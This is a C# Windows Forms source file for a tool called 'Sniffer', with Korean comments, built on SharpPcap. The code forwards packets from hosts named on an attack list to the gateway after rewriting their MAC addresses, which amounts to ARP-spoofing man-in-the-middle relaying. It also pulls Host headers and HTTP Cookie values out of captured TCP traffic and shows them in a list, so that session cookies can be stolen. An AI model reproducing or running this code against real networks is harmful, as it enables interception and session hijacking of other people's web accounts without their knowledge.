using System;
using System.Collections.Generic;
using System.ComponentModel;
using System.Data;
using System.Drawing;
using System.Linq;
using System.Text;
using System.Threading.Tasks;
using System.Windows.Forms;
using SharpPcap;
using System.Runtime.InteropServices;
using System.Net;
using System.Net.NetworkInformation;
using PacketDotNet;
using System.Threading;
namespace Sniffer
{
    
   
    public partial class Main : Form
    {
      //  BaseInformation.IpPacketHeader ipPacketHeader;
        CaptureDeviceList selectedDevices;
        BaseInformation baseInformation;
        PacketHeader packetHeader;



        public Main()
        {
            InitializeComponent();
            selectedDevices = CaptureDeviceList.Instance;
            baseInformation = new BaseInformation();
            packetHeader = new PacketHeader();
            baseInformation.getDefaultGateway();
            baseInformation.getMyIpAddress();
            setlistView();  
        }

        struct Message
        {
            public int id;
            [MarshalAs(UnmanagedType.ByValTStr, SizeConst = 50)]
            public string text;
        }

        private void Icd_OnPacketArrival(object sender, CaptureEventArgs e)
        {
           
          // ipPacketHeader
            IPAddress srcIP;
            IPAddress dstIP;
            StringBuilder sb_Site = new StringBuilder();
            StringBuilder sb_packetSender = new StringBuilder();
            Packet tcpPacket;
            TcpPacket Packetinfo;
            
            RawCapture packet = e.Packet;
            packetByteToStruct(packet.Data);
            

            for (int i = 0; i < BaseInformation.attack_IP_list.Count; i++)
            {
                if (BaseInformation.attack_IP_list[i].Equals(packetHeader.sourceIP))
                {
                    if (packetHeader.type == 1544) // 패킷이 arp일 경우는 arpspoofing 공격을 다시 시작한다.
                    {
                        MessageBox.Show("");
                    }
                    else                           //그 외의 모든 IP 패킷은 다시 전송한다. //보낼 때는 이더넷의 주소를 변경하여 보내준다
                    {
                        byte[] gatewayMac = BaseInformation.gatewayMac.Split('-').Select(x => Convert.ToByte(x, 16)).ToArray();
                        byte[] myMac = BaseInformation.captureDevice.MacAddress.GetAddressBytes();

                        for (int j = 0; j < 6; j++)
                        {
                            packet.Data[j] = gatewayMac[j];
                            packet.Data[j + 6] = myMac[j];
                        }
                        BaseInformation.captureDevice.SendPacket(packet.Data);
                    }
                }
            }
            try
            {
                tcpPacket = Packet.ParsePacket(packet.LinkLayerType, packet.Data);
                Packetinfo = TcpPacket.GetEncapsulated(tcpPacket);
            }
            catch (Exception)
            {
                return;
            }

            if (Packetinfo != null) //tcp일 경우 데이터 정보들을 뽑아 낸다.
            {
                var ipPacket = (PacketDotNet.IpPacket)Packetinfo.ParentPacket;
                srcIP = ipPacket.SourceAddress;
                dstIP = ipPacket.DestinationAddress;
            }
            else
            {
                return;
            }
            //////////////test/////////////////////////////
            /*
            {
                ListViewItem lvi = new ListViewItem();
                System.Text.StringBuilder sb_Cookie = new System.Text.StringBuilder();
                System.Text.StringBuilder sb_SourceIp = new System.Text.StringBuilder();
                sb_Cookie.Append("test1");
                sb_SourceIp.Append("test2");

                lvi.SubItems.Add(srcIP.ToString());
                lvi.SubItems.Add(dstIP.ToString());
                lvi.SubItems.Add(sb_Site.ToString());
                lvi.SubItems.Add(sb_Cookie.ToString());
                sb_Cookie.Clear();

                if (listView.InvokeRequired)
                    listView.Invoke(new MethodInvoker(delegate
                    {
                        listView.Items.Add(lvi);

                    }));
                else
                    listView.Items.Add(lvi);

            }
            */







            
            for (int i = 0; i < packet.Data.Length - 10; i++)       //TCP에서 호스트와 쿠키만 빼온다
            {
                if (packet.Data[i] == 'C' && packet.Data[i + 1] == 'o' && packet.Data[i + 2] == 'o' && packet.Data[i + 3] == 'k' && packet.Data[i + 4] == 'i' && packet.Data[i + 5] == 'e')
                {
                    for (int j = 0; j < packet.Data.Length - 10; j++)
                    {
                        if (packet.Data[j] == 'H' && packet.Data[j + 1] == 'o' && packet.Data[j + 2] == 's' && packet.Data[j + 3] == 't')
                        {
                            sb_Site = new System.Text.StringBuilder();
                            sb_Site.Append(System.Text.Encoding.ASCII.GetChars(packet.Data, j, 20));
                            break;

                        }
                    }
                    ListViewItem lvi = new ListViewItem();
                    System.Text.StringBuilder sb_Cookie = new System.Text.StringBuilder();
                    System.Text.StringBuilder sb_SourceIp = new System.Text.StringBuilder();
                    sb_Cookie.Append(System.Text.Encoding.ASCII.GetChars(packet.Data, i + 7, packet.Data.Length - i - 7));
                    sb_SourceIp.Append(System.Text.Encoding.ASCII.GetChars(packet.Data, 26, 4));

                    lvi.SubItems.Add(srcIP.ToString());
                    lvi.SubItems.Add(dstIP.ToString());
                    lvi.SubItems.Add(sb_Site.ToString());
                    lvi.SubItems.Add(sb_Cookie.ToString());
                    sb_Cookie.Clear();

                    if (listView.InvokeRequired)
                        listView.Invoke(new MethodInvoker(delegate
                        {
                            listView.Items.Add(lvi);

                        }));
                    else
                        listView.Items.Add(lvi);
                }
            }
        }
        private void btn_capture_option_Click(object sender, EventArgs e)
        {
            SelectDevices selectedDeviceForm = new SelectDevices();  
            if (selectedDeviceForm.ShowDialog() == System.Windows.Forms.DialogResult.OK)
            {
                BaseInformation.captureDevice = selectedDevices[selectedDeviceForm.returnDeviceIndex];  //선택한 네트워크 인터페이스를 가져온다.
               
                BaseInformation.captureDevice.Open(DeviceMode.Normal);  //선택한 네트워크 인터페이스를 오픈함
               
                BaseInformation.myMacAddress = BaseInformation.captureDevice.MacAddress.ToString(); //선택한 네트워크 인터페이스의 맥주소를 가져온다.
                baseInformation.sendArpRequest();       //선택한 네트워크로 arp request를 전송한다.
            }

        }
        private void packetByteToStruct(byte[] p)
        {
            for (int i = 0 ; i < 6 ; i++)
                packetHeader.etherDest[i] = p[i];
            for (int i = 0; i < 6; i++)
                packetHeader.etherSource[i] = p[i];
            packetHeader.type = BitConverter.ToUInt16(p, 12);
            
            packetHeader.totalLength = BitConverter.ToUInt16(p, 16);
            packetHeader.identification = BitConverter.ToUInt16(p, 18);
            packetHeader.fragmentOffset = p[20];
            packetHeader.TTL = p[22];
            packetHeader.protocol = p[23];
            packetHeader.headerChecksum = BitConverter.ToUInt16(p, 24);
            packetHeader.sourceIpAddress = BitConverter.ToUInt32(p, 26);
            packetHeader.destIpAddress = BitConverter.ToUInt32(p, 30);
            
            packetHeader.sourceIP = new IPAddress(BitConverter.GetBytes(packetHeader.sourceIpAddress)).ToString();
            packetHeader.destIP = new IPAddress(BitConverter.GetBytes(packetHeader.destIpAddress)).ToString();

        }
       
       
        private void btn_capture_start_Click(object sender, EventArgs e)
        {

            BaseInformation.captureDevice.OnPacketArrival += Icd_OnPacketArrival;
            BaseInformation.captureDevice.StartCapture();
        }

        private void listView_DoubleClick(object sender, EventArgs e)
        {
            int indexnum;
            indexnum = listView.FocusedItem.Index;
            string test = listView.Items[indexnum].SubItems[4].Text;
            MessageBox.Show(test);
        }

        private void btn_arp_attack_Click(object sender, EventArgs e)       
        {
            AttackList AttackListForm = new AttackList();
            AttackListForm.Show();
   
        }
        private void setlistView()
        {
            listView.View = View.Details;
            listView.BeginUpdate();
            listView.Columns.Add("No.");
            listView.Columns.Add("Source");
            listView.Columns.Add("Destination");
            listView.Columns.Add("Sites");
            listView.Columns.Add("Cookie");
        }
    }
}
